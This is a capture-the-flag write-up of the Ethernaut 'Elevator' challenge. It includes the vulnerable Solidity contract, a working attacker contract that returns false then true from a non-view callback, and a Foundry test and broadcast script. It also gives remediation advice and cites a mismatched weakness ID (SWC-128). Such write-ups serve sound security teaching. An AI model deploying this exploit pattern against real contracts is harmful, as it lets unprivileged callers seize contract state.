# Elevator — Security Writeup

| | |
|---|---|
| **Challenge** | [Ethernaut 12 — Elevator](https://smartcontractshacking.com/tools/web3-ctf-challenges/ethernaut-elevator) |
| **Platform** | Smart Contracts Hacking (SCH) / OpenZeppelin Ethernaut |
| **Target** | `src/Elevator.sol` |
| **Solidity** | `^0.8.0` |
| **Severity** | Critical |
| **Status** | Exploited — local PoC passing |

---

## Executive summary

`Elevator.goTo` casts `msg.sender` to `Building` and calls `isLastFloor` twice. Because the interface is not `view`, a malicious building can return `false` on the first call (to pass the gate) and `true` on the second (to set `top`).

**Impact:** unprivileged control of `top` / any logic that trusts inconsistent external callbacks.

---

## Challenge objectives

| # | Condition | How verified |
|---|-----------|--------------|
| 1 | At top floor | `elevatorInstance.top() == true` |

---

## Finding

### [C-01] Manipulable `isLastFloor` callback

| Field | Detail |
|-------|--------|
| **Severity** | Critical |
| **Bug class** | Untrusted external call / interface misuse |
| **Location** | `src/Elevator.sol` `goTo` |
| **SWC** | [SWC-128](https://swcregistry.io/docs/SWC-128) — DoS With Block Gas Limit (related: untrusted gas/callbacks); more precisely untrusted oracle/callback |

#### Vulnerable code

```solidity
function goTo(uint256 _floor) public {
    Building building = Building(msg.sender);
    if (!building.isLastFloor(_floor)) {
        floor = _floor;
        top = building.isLastFloor(floor);
    }
}
```

#### Proof of concept

```bash
cd web3-ctf-challenges/12-ethernaut-elevator
forge test --match-test testExploit -vv
```

**Result:**

```
[PASS] testExploit() (gas: 338103)
```

---

## Attack scenario

### 7-question gate

| Step | Answer |
|------|--------|
| **1. Setup** | Deploy Building that toggles return value |
| **2. Call** | `helper.attack(1)` → `elevator.goTo(1)` |
| **3. Result** | `top == true` |
| **4. Cost** | Gas only |
| **5. ROI** | Control of top flag |
| **6. Privileged?** | No |
| **7. Viable?** | Yes |

---

## Exploit implementation

### SCH (`Exploit.s.sol`)

```solidity
contract HelperContract {
    Elevator private immutable target;
    bool private called;

    constructor(Elevator elevator_) {
        target = elevator_;
    }

    function attack(uint256 floor_) external {
        target.goTo(floor_);
    }

    function isLastFloor(uint256) external returns (bool) {
        if (!called) {
            called = true;
            return false;
        }
        return true;
    }
}

function run() external {
    vm.startBroadcast(PLAYER_PRIVATE_KEY);

    HelperContract helper = new HelperContract(elevatorInstance);
    helper.attack(1);

    vm.stopBroadcast();
}
```

---

## Remediation

1. Mark `isLastFloor` as `view` and avoid depending on untrusted view results for safety.
2. Better: compute “last floor” internally; don’t ask the caller.
3. Never assume two identical external calls return the same value.

---

## Key lessons

1. **`view` matters** — without it, callbacks can mutate and lie between calls.
2. **Don’t trust `msg.sender` interfaces** unless the sender is a known, audited contract.
3. **Two calls ≠ one truth** — cache the result if you must call once.

---

## References

- [SCH Elevator challenge](https://smartcontractshacking.com/tools/web3-ctf-challenges/ethernaut-elevator)
- Local: `Exploit.s.sol`, `test/ElevatorExploit.t.sol`
